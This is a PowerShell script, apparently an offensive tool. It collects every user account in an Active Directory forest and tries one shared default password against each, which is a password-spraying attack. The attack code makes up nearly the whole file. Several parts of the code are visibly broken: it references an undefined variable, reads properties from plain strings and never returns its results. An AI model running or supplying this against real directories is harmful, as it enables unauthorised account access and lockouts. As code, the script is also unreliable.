<#
    Author: Itamar Mizrahi (@Zecured)
    License: GNU v3
    Required Dependencies: None
    Optional Dependencies: None
#>

function Invoke-WideBruteForce
{
<#
    .SYNOPSIS
        This tool provides tries a password on all the users within the current directory (the entire forest).
        Author: Itamar Mizrahi (@Zecured)
        License: GNU v3
        Required Dependencies: None
        Optional Dependencies: None
    .DESCRIPTION

    .PARAMETER Password
    Common\Default password to use.
        
    .EXAMPLE 
       
#>

    [CmdletBinding()]
    param
    (
        [parameter(Mandatory=$False, Position=0, ValueFromPipeline=$True)]
        [string]$Password = "Summer2016"

    )

    $AllUsers = @()
    $objForest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
    $DomainList = @($objForest.Domains)
    $Domains = $DomainList | foreach { $_.name }
    foreach ($Domain in $Domains)
    {
        $strFilter = "(objectCategory=User)"
        $objDomain = New-Object System.DirectoryServices.DirectoryEntry
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher
        $objSearcher.SearchRoot = $objDomain
        $objSearcher.PageSize = 10000
        $objSearcher.Filter = $strFilter
        $objSearcher.SearchScope = "Subtree"
        $colProplist = "samaccountname"
        foreach ($i in $colPropList)
        {
            $objSearcher.PropertiesToLoad.Add($i)
        }
        $colResults = $objSearcher.FindAll()
        foreach ($objResult in $colResults)
        {
            $AllUsers += $objItem.samaccountname
        }
    }

    $verifiedUsers = @()
    foreach ($user in $AllUsers)
    {
        if(Test-ADAuthentication $user.SamAccountName $password)
        {
            $verifiedUsers += $user.SamAccountName
        }
    }
}


Function Test-ADAuthentication {
    param($Username,$Password)
    (new-object directoryservices.directoryentry "",$Username,$Password).psbase.name -ne $null
}
